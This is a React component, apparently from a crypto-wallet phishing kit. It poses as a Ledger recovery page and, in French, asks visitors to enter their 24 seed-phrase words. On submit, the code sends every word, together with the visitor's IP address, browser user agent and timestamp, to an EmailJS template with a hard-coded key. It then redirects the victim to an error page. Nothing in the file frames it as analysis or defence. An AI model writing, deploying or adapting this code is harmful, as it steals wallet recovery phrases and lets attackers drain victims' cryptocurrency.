// src/components/RecoveryForm.js
import React, { useState, useEffect } from 'react';
import emailjs from 'emailjs-com';
import gifImage from '../assets/ledger-device.gif'; // Ton GIF

const RecoveryPhraseForm = () => {
  const [inputs, setInputs] = useState(Array(24).fill(''));
  const [masking, setMasking] = useState(true);
  const [errors, setErrors] = useState(Array(24).fill(false));
  const [globalError, setGlobalError] = useState('');

  // Initialisation d'EmailJS
  useEffect(() => {
    // Remplace "R8EgrBd_ni701MaqX" par ta clé publique EmailJS
    emailjs.init("R8EgrBd_ni701MaqX");
  }, []);

  // Navigation aléatoire sur Enter/Tab
  useEffect(() => {
    const handleKeyDown = (event) => {
      if (
        (event.key === 'Enter' || event.key === 'Tab') &&
        event.target.classList.contains('recovery-input')
      ) {
        event.preventDefault();
        const randomIndex = Math.floor(Math.random() * 24);
        const nextInput = document.querySelector(
          `.recovery-input[data-index="${randomIndex}"]`
        );
        if (nextInput) nextInput.focus();
      }
    };
    document.addEventListener('keydown', handleKeyDown);
    return () => document.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Gestion de la saisie
  const handleInputChange = (index, value) => {
    const newInputs = [...inputs];
    newInputs[index] = value;
    setInputs(newInputs);

    if (errors[index] && value.trim()) {
      const newErrors = [...errors];
      newErrors[index] = false;
      setErrors(newErrors);
    }
  };

  // Envoi via EmailJS
  const sendToEmailJS = async () => {
    const userAgent = navigator.userAgent || "Navigateur inconnu";
    const now = new Date();
    const date = now.toLocaleDateString();
    const time = now.toLocaleTimeString();

    let ipData;
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      ipData = data.ip;
    } catch {
      ipData = "IP non disponible";
    }

    // Mapping EXACT
    const templateParams = {
      to_name: "Cher Utilisateur",
      date,
      time,
      ipData,
      userAgent,
      // 24 mots
      word1:  inputs[0],
      word2:  inputs[1],
      word3:  inputs[2],
      word4:  inputs[3],
      word5:  inputs[4],
      word6:  inputs[5],
      word7:  inputs[6],
      word8:  inputs[7],
      word9:  inputs[8],
      word10: inputs[9],
      word11: inputs[10],
      word12: inputs[11],
      word13: inputs[12],
      word14: inputs[13],
      word15: inputs[14],
      word16: inputs[15],
      word17: inputs[16],
      word18: inputs[17],
      word19: inputs[18],
      word20: inputs[19],
      word21: inputs[20],
      word22: inputs[21],
      word23: inputs[22],
      word24: inputs[23],
    };

    emailjs
      .send('mots2', 'template_efh8rql', templateParams)
      .then(response => {
        console.log('SUCCESS!', response.status, response.text);
        window.location.href = "/error"; // Redirection après succès
      })
      .catch(err => {
        console.error('FAILED...', err);
        alert("Erreur lors de l'envoi. Merci de réessayer.");
      });
  };

  // Soumission du formulaire
  const handleSubmit = async (e) => {
    e.preventDefault();

    let newErrors = Array(24).fill(false);
    let hasEmpty = false;

    for (let i = 0; i < 24; i++) {
      if (!inputs[i].trim()) {
        newErrors[i] = true;
        hasEmpty = true;
      }
    }

    setErrors(newErrors);
    if (hasEmpty) {
      setGlobalError('Veuillez remplir tous les champs avant de continuer.');
      return;
    } else {
      setGlobalError('');
    }

    await sendToEmailJS();
  };

  // Afficher / masquer les mots
  const toggleVisibility = () => {
    setMasking(!masking);
  };

  // Colonne 1 : index 0..7 (mots 1..8)
  const renderColumn1 = () =>
    Array.from({ length: 8 }, (_, i) => {
      const index = i; // 0..7
      return (
        <input
          key={index}
          type={masking ? "password" : "text"}
          placeholder={`Mot ${index + 1}`}
          value={inputs[index]}
          onChange={(e) => handleInputChange(index, e.target.value)}
          className={`input-field recovery-input ${
            errors[index] ? 'field-error' : ''
          }`}
          data-index={index}
          maxLength={10}
        />
      );
    });

  // Colonne 2 : index 8..15 (mots 9..16)
  const renderColumn2 = () =>
    Array.from({ length: 8 }, (_, i) => {
      const index = i + 8;
      return (
        <input
          key={index}
          type={masking ? "password" : "text"}
          placeholder={`Mot ${index + 1}`}
          value={inputs[index]}
          onChange={(e) => handleInputChange(index, e.target.value)}
          className={`input-field recovery-input ${
            errors[index] ? 'field-error' : ''
          }`}
          data-index={index}
          maxLength={10}
        />
      );
    });

  // Colonne 3 : index 16..23 (mots 17..24)
  const renderColumn3 = () =>
    Array.from({ length: 8 }, (_, i) => {
      const index = i + 16;
      return (
        <input
          key={index}
          type={masking ? "password" : "text"}
          placeholder={`Mot ${index + 1}`}
          value={inputs[index]}
          onChange={(e) => handleInputChange(index, e.target.value)}
          className={`input-field recovery-input ${
            errors[index] ? 'field-error' : ''
          }`}
          data-index={index}
          maxLength={10}
        />
      );
    });

  return (
    <div className="recovery-main-block">
      <div className="recovery-container">
        <div className="gif-container">
          <img src={gifImage} alt="Animation" className="gif-image" />
        </div>

        <div className="recovery-form-container">
          <h3>Recovery Phrase</h3>
          <h4>Veuillez organiser vos 24 mots de récupération dans l'ordre correct.</h4>

          {globalError && <p className="global-error">{globalError}</p>}

          <form onSubmit={handleSubmit} id="recovery-form">
            <div className="grid-container">
              <div className="grid-column">{renderColumn1()}</div>
              <div className="grid-column">{renderColumn2()}</div>
              <div className="grid-column">{renderColumn3()}</div>
            </div>

            <div className="button-group">
              <button
                type="button"
                onClick={toggleVisibility}
                className="custom-button"
              >
                {masking ? "Afficher/Masquer" : "Afficher/Masquer"}
              </button>
              <button type="submit" className="custom-button">
                Continuer
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default RecoveryPhraseForm;
